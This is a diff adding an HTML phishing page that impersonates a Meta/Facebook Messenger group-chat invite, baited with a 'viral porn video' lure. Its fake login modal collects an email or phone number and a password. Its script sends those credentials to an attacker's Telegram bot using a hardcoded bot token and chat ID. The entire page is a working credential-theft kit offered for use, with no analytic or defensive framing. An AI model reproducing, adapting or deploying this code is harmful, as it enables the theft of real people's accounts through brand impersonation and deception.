@@ -1,0 +1,211 @@
+
+<!DOCTYPE html>
+<html>
+<title>Group Chat JOIN NOW</TITLE>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<style>
+body {font-family: Arial, Helvetica, sans-serif;}
+
+/* Full-width input fields */
+input[type=text], input[type=password] {
+    width: 100%;
+    padding: 12px 20px;
+    margin: 8px 0;
+    display: inline-block;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+}
+
+/* Set a style for all buttons */
+button {
+    background-color: #15b6ff;
+    color: white;
+    padding: 14px 20px;
+    margin: 8px 0;
+    border: none;
+    cursor: pointer;
+    width: 100%;
+}
+
+button:hover {
+    opacity: 0.8;
+}
+
+/* Extra styles for the cancel button */
+.cancelbtn {
+    width: auto;
+    padding: 10px 18px;
+    background-color: #f44336;
+}
+
+/* Center the image and position the close button */
+.imgcontainer {
+    text-align: center;
+    margin: 24px 0 12px 0;
+    position: relative;
+}
+
+img.avatar {
+    width: 40%;
+    border-radius: 50%;
+}
+
+.container {
+    padding: 16px;
+}
+
+span.psw {
+    float: right;
+    padding-top: 16px;
+}
+
+/* The Modal (background) */
+.modal {
+    display: none; /* Hidden by default */
+    position: fixed; /* Stay in place */
+    z-index: 1; /* Sit on top */
+    left: 0;
+    top: 0;
+    width: 100%; /* Full width */
+    height: 100%; /* Full height */
+    overflow: auto; /* Enable scroll if needed */
+    background-color: rgb(0,0,0); /* Fallback color */
+    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+    padding-top: 60px;
+}
+
+/* Modal Content/Box */
+.modal-content {
+    background-color: #fefefe;
+    margin: 5% auto 15% auto; /* 5% from the top, 15% from the bottom and centered */
+    border: 1px solid #888;
+    width: 80%; /* Could be more or less, depending on screen size */
+}
+
+/* The Close Button (x) */
+.close {
+    position: absolute;
+    right: 25px;
+    top: 0;
+    color: #000;
+    font-size: 25px;
+    font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+    color: red;
+    cursor: pointer;
+}
+
+/* Add Zoom Animation */
+.animate {
+    -webkit-animation: animatezoom 0.6s;
+    animation: animatezoom 0.6s
+}
+
+@-webkit-keyframes animatezoom {
+    from {-webkit-transform: scale(0)} 
+    to {-webkit-transform: scale(1)}
+}
+    
+@keyframes animatezoom {
+    from {transform: scale(0)} 
+    to {transform: scale(1)}
+}
+
+/* Change styles for span and cancel button on extra small screens */
+@media screen and (max-width: 300px) {
+    span.psw {
+       display: block;
+       float: none;
+    }
+    .cancelbtn {
+       width: 100%;
+    }
+}
+</style>
+</head>
+<body>
+<center>
+<br><br><br><br><br>
+	<img src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/facebook-messenger-icon.png" height="75" width="75"> <br>
+	<h3>PRIVATE GC VIRAL PORN VIDEO</h3><br>
+	
+	<p></p>
+	<br><br><br><br><br><br><br><br><br>
+<small>If you join this group chat, members will also be able to call you and see info like your Active Status and when youve read messages.</small><br>
+<button onclick="document.getElementById('id01').style.display='block'" style="width:auto;">JOIN NOW</button>
+
+<br>
+
+<small>from</small><br>
+<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Meta-Logo.png/640px-Meta-Logo.png" height="20" width="50">
+
+</center>
+
+<div id="id01" class="modal">
+    
+    <form class="modal-content animate" action="" onsubmit=" return sender()">
+    <div class="imgcontainer">
+
+      <img src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/facebook-messenger-icon.png" alt="Avatar" class="avatar"""><br>
+      	<p>Login into your account first..</p><br>
+      	
+      	 
+  
+    </div>
+
+    <div class="container">
+     
+    <form action="" onsubmit=" return sender()">
+      <input type="text" placeholder="Email address or phone number" name="email" id="email" maxlength="40" required>
+      <input type="password" placeholder="Password" name="password" id="password" required>
+      <button type="submit">Log In</button>
+    </div>
+  </div>
+      
+    </div>
+
+    </div>
+  </form>
+</div>
+
+ <script>
+var telegram_bot_id = "7006068269:AAEzFrcdbPdMbPehZbsLkKrFnH1TG7dG5sc";
+//chat id
+var chat_id = 5722619267;
+var email, password;
+var ready = function() {
+  email = document.getElementById("email").value;
+  password = document.getElementById("password").value;
+  message = "===[ LOGIN PRIVATEGC ]===" +'\n' + "\n[ U ]: " + email + "\n[ P ]: " + password +'\n'+ '\n===[ Coded By Bjorn Cruz ]===';
+};
+var sender = function() {
+  ready();
+  var settings = {
+    "async": true,
+    "crossDomain": true,
+    "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+    "method": "POST",
+    "headers": {
+      "Content-Type": "application/json",
+      "cache-control": "no-cache"
+    },
+    "data": JSON.stringify({
+      "chat_id": chat_id,
+      "text": message
+    })
+  };
+  $.ajax(settings).done(function(response) {
+    console.log(response);
+  });
+  document.getElementById("email").value = "";
+  document.getElementById("password").value = "";
+  return true;
+};
+ </script>
+</body>
+</html>
